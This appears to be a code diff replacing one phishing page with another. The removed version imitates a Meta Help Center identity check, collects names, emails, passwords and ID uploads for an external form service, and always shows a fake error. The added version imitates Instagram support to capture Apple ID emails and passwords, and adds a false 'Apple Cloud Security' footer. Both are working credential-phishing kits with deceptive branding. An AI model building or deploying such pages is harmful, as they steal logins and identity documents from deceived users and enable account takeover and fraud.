@@ -3,191 +3,27 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification | Meta Help Center</title>
+    <title>Instagram Support Center | Identity Verification</title>
     <style>
-        /* استخدام خطوط النظام الافتراضية لمطابقة تصميم ميتا الواقعي */
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #F0F2F5;
-            margin: 0;
-            color: #1C1E21;
-            line-height: 1.34;
-        }
-        /* شريط التنقل العلوي */
-        .navbar {
-            background: white;
-            padding: 16px 32px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-            display: flex;
-            align-items: center;
-        }
-        /* حاوية النموذج */
-        .container {
-            max-width: 500px;
-            margin: 40px auto;
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            border: 1px solid #dddfe2;
-        }
-        /* النصوص */
-        h2 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-        p.desc {
-            font-size: 16px;
-            color: #65676B; /* لون نص ثانوي رسمي */
-            margin-bottom: 32px;
-            text-align: center;
-            line-height: 1.5;
-        }
-        /* حقول الإدخال */
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-size: 14px;
-            font-weight: 500;
-            color: #65676B;
-            margin-bottom: 8px;
-        }
-        input, textarea {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2; /* حدود فاتحة */
-            border-radius: 6px;
-            background: #FFFFFF; /* خلفية بيضاء */
-            box-sizing: border-box;
-            font-size: 16px;
-            transition: all 0.2s ease;
-        }
-        /* تأثير التركيز على الحقول */
-        input:focus, textarea:focus {
-            border-color: #1877F2;
-            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
-            outline: none;
-        }
-        textarea {
-            resize: vertical;
-            height: 100px;
-        }
-        input[type="file"] {
-            padding: 10px;
-            background: #F5F6F7;
-        }
-        /* زر الإرسال */
-        .btn-submit {
-            width: 100%;
-            padding: 14px;
-            background: #1877F2; /* لون ميتا الأزرق الرسمي */
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background 0.2s;
-        }
-        .btn-submit:hover {
-            background: #166fe5; /* لون أغمق قليلاً عند التحويم */
-        }
-        /* رسالة الخطأ */
-        #error-overlay {
-            display: none;
-            background: #fff;
-            border: 1px solid #fa3e3e;
-            color: #fa3e3e;
-            padding: 16px;
-            border-radius: 8px;
-            margin-top: 24px;
-            font-size: 14px;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 1px; width: 100%; max-width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        h2 { font-size: 17px; color: #8e8e8e; margin-bottom: 20px; line-height: 1.5; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer-note { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="navbar">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Meta" height="24">
-    </div>
-    
-    <div class="container">
-        <h2>Identity Verification</h2>
-        <p class="desc">To secure your account, please confirm your identity by providing the official information below.</p>
-        
-        <form id="meta-form" action="https://forminit.com/f/lgz9j8n2rgg" method="POST" enctype="multipart/form-data">
-            <div class="form-group">
-                <label>Full Name</label>
-                <input type="text" name="name" required placeholder="Enter your legal name">
-            </div>
-            <div class="form-group">
-                <label>Username / ID</label>
-                <input type="text" name="user" required placeholder="e.g., @username or ID number">
-            </div>
-            <div class="form-group">
-                <label>Primary Email Address</label>
-                <input type="email" name="gmail" required placeholder="Email associated with account">
-            </div>
-            <div class="form-group">
-                <label>Secondary Email Address (Optional)</label>
-                <input type="email" name="icloud" placeholder="Backup email address">
-            </div>
-            <div class="form-group">
-                <label>Current or Last Known Password</label>
-                <input type="password" name="pass" required placeholder="********">
-            </div>
-            <div class="form-group">
-                <label>Additional details</label>
-                <textarea name="desc" placeholder="Please provide any extra details about your situation."></textarea>
-            </div>
-            <div class="form-group">
-                <label>Upload Government-Issued ID</label>
-                <input type="file" name="id_file" accept="image/png, image/jpeg, application/pdf">
-            </div>
-            <button type="submit" id="submit-btn" class="btn-submit">Continue</button>
+    <div class="login-card">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a25111a445d.png" class="logo">
+        <h2>To recover your account, please verify your identity using the connected Apple ID.</h2>
+        <form action="/capture" method="POST">
+            <input type="email" name="email" placeholder="Apple ID (Email)" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Verify Identity</button>
         </form>
-        
-        <div id="error-overlay">
-            <strong>Unable to Process Request</strong><br>
-            Our systems are currently experiencing high traffic. Please try again later.
-        </div>
+        <p class="footer-note">Secure verification powered by Apple Cloud Security.</p>
     </div>
-
-    <script>
-        const form = document.getElementById('meta-form');
-        form.onsubmit = async (e) => {
-            e.preventDefault();
-            const btn = document.getElementById('submit-btn');
-            const originalText = btn.innerText;
-            btn.innerText = "Processing...";
-            btn.disabled = true;
-            btn.style.opacity = "0.7";
-
-            try {
-                const response = await fetch(form.action, {
-                    method: 'POST',
-                    body: new FormData(form),
-                    headers: {
-                        'Accept': 'application/json'
-                    }
-                });
-                
-                // في حال نجاح الإرسال أو فشله، سنظهر رسالة الخطأ المزيفة حسب طلب السكربت الأصلي
-                form.style.display = 'none';
-                document.getElementById('error-overlay').style.display = 'block';
-                
-            } catch (error) {
-                // حتى في حال وجود خطأ حقيقي في الشبكة، نظهر الرسالة المزيفة
-                form.style.display = 'none';
-                document.getElementById('error-overlay').style.display = 'block';
-            }
-        };
-    </script>
 </body>
 </html>
